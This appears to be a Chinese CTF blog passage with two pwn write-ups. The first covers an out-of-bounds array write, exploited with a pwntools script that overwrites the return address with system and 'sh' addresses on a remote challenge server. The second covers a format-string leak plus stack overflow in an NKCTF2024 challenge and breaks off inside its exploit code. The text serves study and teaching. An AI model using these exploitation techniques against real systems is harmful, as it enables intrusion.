<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> m; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*                      An easy calc                       *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*Give me your numbers and I will return to you an average *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*(0 &lt;= x &lt; 256)                                           *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers you have:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your numbers&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="type">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">&quot;average is %.2lf\n&quot;</span>, (<span class="type">double</span>)((<span class="type">long</span> <span class="type">double</span>)v9 / (<span class="type">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Give me your number&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;id\t\tnumber&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t\t%d\n&quot;</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; j; ++m )</span><br><span class="line">      v9 += v13[m];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题的主函数在这里，但同时这道题是有后门函数存在的，</p>
<p><img src="/2024/03/30/%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/image-20240407215605571.png" alt="image-20240407215605571"></p>
<p>便不再需要自己去构造后门函数，还算方便，只要能将函数的执行劫持到这个后门函数的这里便能得到shell。这里仔细看会发现有一个问题，system函数执行的内容是&#x2F;bin&#x2F;bash而不是&#x2F;bin&#x2F;sh，如果这直接跳转到这里其实是不能拿到shell的，这里看了网上的说法，好像是因为这个题的出题人整错了，才出现的这个问题， 不过也能做，就是将程序的执行过程进行构造，将sh直接传入system函数中也能像执行system（&#x2F;bin&#x2F;sh）一样拿到shell。并且这个程序是32位的程序，不用使用寄存器进行传值，直接传就行，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*垃圾值+p32(system函数地址)+p32（sh的地址）</span><br></pre></td></tr></table></figure>

<p>最开始做的时候便是将这个忘了，整成先是sh后是system，这里说明一下。</p>
<p>这道题的大致思路就是，在一开始时先输入我们要输入的数的个数，然后便开始依此输入我们要输的数，只后便会出现5个选项，1是将我们输入的数打印在屏幕上，2是增加一个新的数，4是直接将我们输入的数据的和打印在屏幕上，5是结束程序，还有一个3便是我们的漏洞所在。</p>
<p>这里如果进入3的选项，用于改变之前输入的数据，首先让我们输入我们要改变的数据的位置，既我们要改变的数据在之前输入的数据中排第几，然后便让我们输入改变后的数据，</p>
<p>这里看起来好像没有什么问题，但仔细看看会发现这里是要我们先输入要改变的数据在之前输入的数据中所排的位置然后在输入要改变的数据，这里有个巨大的问题在于程序并没有对我们输入的位置进行检测，而是完全信任我们输入的位置，因此理论上来说我们可以输入无限大的数据，程序都会为我们找到我们输入的大小在程序中相对最开始我们输入的数据的存放位置的偏移，然后再录入我的新数据。形成上文中的数组越界漏洞。</p>
<p>因此在这里只要我们能找到在最开始我们输入的数据存放的最开始的地方，与之后程序ret要到的地方，计算这两个地方的偏移量，然后以及改变ret后要到的地方的地址为我们要执行的程序的地址，便可以形成shell。</p>
<p>在修改后要执行的程序在前文中已有提及，便是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system函数的地址+sh的地址</span><br></pre></td></tr></table></figure>

<p>这两个数据都是很好拿倒的，现在的问题在于寻找最开始输入的数据的存放位置，与我们要改变的数据的位置。</p>
<p>0xffffd03c</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">55356</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x80487F3&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;have:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;numbers\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">addr,num</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which number to change:\n&quot;</span>,<span class="built_in">str</span>(addr)) </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;new number:\n&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">office=<span class="number">0x84</span></span><br><span class="line"></span><br><span class="line">send(office+<span class="number">8</span>,<span class="number">135</span>)</span><br><span class="line">send(office+<span class="number">9</span>,<span class="number">137</span>)</span><br><span class="line">send(office+<span class="number">10</span>,<span class="number">4</span>)</span><br><span class="line">send(office+<span class="number">11</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">send(office,<span class="number">80</span>)</span><br><span class="line">send(office+<span class="number">1</span>,<span class="number">132</span>)</span><br><span class="line">send(office+<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">send(office+<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-hxctf" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/28/hxctf/" class="article-date">
  	<time datetime="2024-03-28T07:08:34.000Z" itemprop="datePublished">2024-03-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/28/hxctf/">
        NKctf2024 第一题
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>  这是一道之前在有个周末的比赛中的题，比赛是NKCTF2024，网站已经没有了，算是一个战队的招新比赛吧，不过算是一道比较简单的题，主要的漏洞就是格式化字符串漏洞和一个栈溢出，相较于之前那些动不动就上堆的题目好了不止一点，虽然在最后的时候还会有一个特别坑的地方，不够这就已经是后话了，等到的时候再慢慢说。</p>
<p>老规矩，先checksec一下程序，保护全开，有点难整，不过还是丢到ida里面去看看怎么样，</p>
<p><img src="/2024/03/28/hxctf/image-20240328153030882.png" alt="image-20240328153030882"></p>
<p>这是在ida里面的主函数的样子</p>
<p><img src="/2024/03/28/hxctf/image-20240328153438575.png" alt="image-20240328153438575"></p>
<p>有canary保护，主要程序一上来就是一个无限循环的函数，便开始跟随程序的过程一步一步来，先看sub_1289()这第一个函数，感觉像解决缓冲区的函数，</p>
<p><img src="/2024/03/28/hxctf/image-20240328153959045.png" alt="image-20240328153959045"></p>
<p>果然是一个用于解决缓冲区的函数，不过问题是在代码的最后几行使用了，seccomp函数，这个函数一般是用来开起沙箱保护，关于具体使用沙箱禁止了哪些函数可以用工具直接查看，关于工具的使用如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./文件名</span><br></pre></td></tr></table></figure>

<p>关于这个工具，如果一个程序开启了沙箱，这会出现类似如下的情况，如果没开则会直接进入程序的执行过程</p>
<p>这道题的沙箱结果如下，</p>
<p>当时我第一次分析的时候，不理解这个沙箱的含义，误以为这个题是只能进行open函数的系统调用，导致做了一个下午的无用过，这里便将这个工具的大概讲一讲避免下次还出现这样的傻13问题</p>
<img src="/2024/03/28/hxctf/image-20240328155823265.png" alt="image-20240328155823265" style="zoom: 25%;">

<img src="/2024/03/28/hxctf/image-20240328154528444.png" alt="image-20240328154528444" style="zoom: 200%;">



<p>关于这个工具的具体是嘛，我已不太懂，不过现在大概明白该怎么看这个工具的使用，像这道题中就有A&#x3D;&#x3D;open就跳转0007，而0007的内容便是kill像这种便是将open函数紧用，而其他的函数都是可以用的。如果还有其他函数后面跟的数字在前面的表中的最后是kill这这个函数便是禁用的，其他的函数便是可以用的，像这题便是可以通过system等系统调用从而进行拿到远程服务器的shell，但同时禁用的open便不再能使用orw的办法将远程的flag直接读到屏幕上。</p>
<p>现在便在次回到一开始的main函数中，开始执行，会要我们输入点东西，只是这个有限制，只能输入1和2并且输入2还没有什么用，暂时会回到程序一开始输入的地方，我们便只能输入1，进入到sub_188c()这个函数中，</p>
<p><img src="/2024/03/28/hxctf/image-20240328162015627.png" alt="image-20240328162015627"></p>
<p>很明显这个函数中没有什么可以用的地方，但是当我们回到main函数中，找到sub_19EA()函数并进入其中，会发现直接出现了一个格式化漏洞，如下，</p>
<p><img src="/2024/03/28/hxctf/image-20240328162412607.png" alt="image-20240328162412607"></p>
<p>很明显关这一个格式化漏洞变可以将canary和pie保护都给绕过，还可以将程序的libc_base地址暴露出来，配合同题目一起下载的libc版本，大部分栈的问题基本就解决了，虽然在这里能read的数据才只有8字节，能暴露的数据好像挺少的，但别忘了在main函数中这是一个巨大的无限循环函数，只要在执行完这个函数后再回到之前的地方，然后在执行会来便可以有多暴露几个地址。同时查看这个函数中的sub_1984()函数会发现，又有新的漏洞。</p>
<p>在这里我们想要进入sub_1984()函数之前还会有一个判断，当dword_504c &lt; dword_5010会直接进入exit中从而结束进程，因此我们要保证dword_504c &gt; dword_5010从而顺利进入sub_1984()函数，而这两个数dword_5010的大小为11682，而dword_504c则和之前的一个函数中的过程有关系，到之后在讲，反正要保证在执行这个函数之前dword_504c的值一定要大于11682。</p>
<p><img src="/2024/03/28/hxctf/image-20240328162449070.png" alt="image-20240328162449070"></p>
<p>在这里有一个致命的漏洞，便是栈溢出，可以读0x80的数据但buf只能放0x30的数据，在结合之前的格式化字符串漏洞，将canary绕过，然后执行system（&#x2F;bin&#x2F;sh）便可以直接拿到shell。</p>
<p>那现在便要回到main函数中，看怎么才能到sub_19EA()中，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1289();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_134F();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_188C();</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> &amp;&amp; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_19EA();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> || v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid option.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Calculate your rating first.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在这里可以很明显看出来，要进入到其中必须保证输入的v3&#x3D;&#x3D;2&amp;&amp;v4，而如果一开始就输入2那v4的值为0，将不会成立，因此要先执行v3&#x3D;&#x3D;1是的所有函数并成功退出来，使v4&#x3D;&#x3D;1，然后将v3输入2，才能进入其中，</p>
<p>于我们便进入sub_188C()函数中去寻找如何能过顺利通过这个函数，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_188C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">double</span> v0; <span class="comment">// xmm0_8</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">double</span> v5; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">double</span> v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [rsp+23h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input chart level and rank.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">49</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lf %s&quot;</span>, &amp;v5, v7);</span><br><span class="line">    v0 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">15.0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = v3++;</span><br><span class="line">      <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_1633(v7);</span><br><span class="line">    v6 = v0 * v5 + v6;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_504C = (<span class="type">int</span>)v6;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Calculation Done.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在第一次看这里的时候会发现是个有50次循环的函数，每一次都需要输入一个双精度浮点数（小数，121.22）和字符，然后好像只要输入的双精度浮点数是15.0，便可以满足第一个判断条件，使v1&#x3D;&#x3D;v3++，由于输入时的v3为1那此时v1变等于2，满足条件，进入函数中，然后返回去。</p>
<p>这个如果是像上面想的一样就好了，但在运行时会发现并不是这样的，他依然会再次循环，重新输入两个数，因此不在想通过满足条件的方法返回，干脆直接写一个函数运行50次。进行50次的输入，从而完成循环，返回main函数。</p>
<p>在这里有一个函数是关于我们输入的字符v7的，如下</p>
<p><img src="/2024/03/28/hxctf/image-20240328185516369.png" alt="image-20240328185516369"></p>
<p>这段代码看起来是一个简单的映射函数，根据输入的不同字符串返回不同的64位整数值。我们在运行时喂了满足要求，便可以将之前那个循环中的要输入的字符串，定为这里面的随机一个（C，D，A，B任选一个便可以）。</p>
<p>再往下面看会有两行有趣的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v6 = v0 * v5 + v6;</span><br><span class="line">dword_504C = (<span class="type">int</span>)v6;</span><br></pre></td></tr></table></figure>

<p>在前面的代码可以知道，v5是我们输入的数，v0&#x3D;&#x3D;v5，在执行这里前v6&#x3D;0，因此dword_504C值等于我们再循环中输入的最后一次的数的平方，然后在后面我们为了要进入那个漏洞函数必须要保证dword_504c的值一定要大于11682，因此我们写入得数可以考虑大一点，方便后面直接进入栈溢出函数，</p>
<p>于此便可以写出能进入sub_19EA()函数的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;111.0 SSS+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Select a option:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>自此便能顺利进入sub_19EA()函数中，进行地址的泄露，和栈溢出，这里边不在多讲，比较简单，只要注意的在与，当到栈溢出时候，只要不溢出，便又会回到main函数，并且这里由于之前已经将1中的过程过了便可以不在过1，直接进行2进入到格式化漏洞出。</p>
<p>具体的看exp便可以，然后在exp中由于在一开始写的时候将沙箱的内容看错，因此有的写的多了，在真正用的并不是全部的，有的可以删去，并没有删（太懒了不想动了），并且有的地方可以写成函数已没有，因此重复的地方有点多（python有点差了·，找时间补一下）具体的自己看吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 